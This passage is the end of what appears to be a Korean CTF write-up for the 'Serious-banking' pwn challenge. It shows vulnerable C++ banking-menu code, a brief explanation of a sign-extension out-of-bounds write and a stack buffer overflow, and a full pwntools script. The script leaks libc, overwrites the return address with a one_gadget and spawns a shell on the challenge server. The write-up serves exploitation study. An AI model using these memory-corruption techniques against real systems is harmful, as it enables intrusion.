</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (number <span style="color:#f92672">&gt;=</span> account_count) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;That account does not exist.&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                accounts[number].active <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Which account does this issue concern? &#34;</span>);
</span></span><span style="display:flex;"><span>                size_t number;
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin <span style="color:#f92672">&gt;&gt;</span> number;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                fgetc(stdin);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                Account acc <span style="color:#f92672">=</span> accounts[number];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">40</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Support ticket from &#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> content <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1000</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Please describe your issue (1000 charaters): &#34;</span>);
</span></span><span style="display:flex;"><span>                std<span style="color:#f92672">::</span>cin.getline(content, <span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>cin.fail()) {
</span></span><span style="display:flex;"><span>                    printf(<span style="color:#e6db74">&#34;Invalid Input.&#34;</span>);
</span></span><span style="display:flex;"><span>                    exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name_ptr <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> strlen(name);
</span></span><span style="display:flex;"><span>                strcpy(name_ptr, acc.name);
</span></span><span style="display:flex;"><span>                name_ptr <span style="color:#f92672">+=</span> strlen(acc.name);
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">*</span>name_ptr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                submit_support_ticket(name, content);
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Thanks! Our support technicians will help you shortly.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">delete</span>[] content;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                printf(<span style="color:#e6db74">&#34;Invalid option %d</span><span style="color:#ae81ff">\n\n\n</span><span style="color:#e6db74">&#34;</span>, selection);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    setbuf(stdout, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    separator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">128</span>];
</span></span><span style="display:flex;"><span>    debug_log <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">2900</span>];
</span></span><span style="display:flex;"><span>    accounts <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Account[<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    strcpy(debug_log, <span style="color:#e6db74">&#34;TODO&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">126</span>; i<span style="color:#f92672">++</span>) separator[i] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>;
</span></span><span style="display:flex;"><span>    separator[<span style="color:#ae81ff">126</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
</span></span><span style="display:flex;"><span>    separator[<span style="color:#ae81ff">127</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    interface();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span>[] separator;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span>[] debug_log;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span>[] accounts;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
<p>Create Transaction이 실행될때 두번의 참조가 일어나게 된다.
id는 char이므로 sign extension이 일어나서 oob write가 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>    accounts[from.id].balance <span style="color:#f92672">-=</span> amount;
</span></span><span style="display:flex;"><span>    accounts[to.id].balance <span style="color:#f92672">+=</span> amount;
</span></span></code></pre></div><p>그리고 아래에서 stack bof가 터진다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name_ptr <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> strlen(name);
</span></span><span style="display:flex;"><span>    strcpy(name_ptr, acc.name);
</span></span><span style="display:flex;"><span>    name_ptr <span style="color:#f92672">+=</span> strlen(acc.name);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>name_ptr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span></code></pre></div><h3 id="exploit-script-1">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./vuln&#39;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;serious-banking.chal.irisc.tf&#39;</span>,<span style="color:#ae81ff">10001</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;localhost&#39;,1024)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc = ELF(&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./bc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level=&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">134</span>)):
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Name&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer</span>(fr,to,amount):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> amount <span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;from&#39;</span>,str(fr))
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;to&#39;</span>,str(to))
</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;transfer? &#39;</span>,str(amount))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">0x34</span>)):
</span></span><span style="display:flex;"><span>    transfer(<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>transfer(<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">30</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">0x34</span>)):
</span></span><span style="display:flex;"><span>    transfer(<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>transfer(<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">30</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">123</span>)):
</span></span><span style="display:flex;"><span>    transfer(i,<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>transfer(<span style="color:#ae81ff">130</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x5f5f5f -&gt; 0x7025 -&gt; %p</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0x&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> int(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0x&#39;</span><span style="color:#f92672">+</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>write <span style="color:#f92672">-</span><span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>success(hex(libc_base))
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xe5306 , 0x4497f , 0x449d3</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x44</span>)<span style="color:#f92672">+</span>p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe5306</span>)
</span></span><span style="display:flex;"><span>print(payload)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Name&#39;</span>,payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>) 
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;? &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;134&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;asdf&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OoB Add/Sub</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stack Bof</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OoB copy</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Heap OoB Add/Sub </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/sqlite-internals/">sqlite internals</a></li>
      <li><a href="https://msh1307.kr/tags/sqlite-exploit/">sqlite exploit</a></li>
      <li><a href="https://msh1307.kr/tags/sequilitis/">sequilitis</a></li>
      <li><a href="https://msh1307.kr/tags/serious-banking/">Serious-banking</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
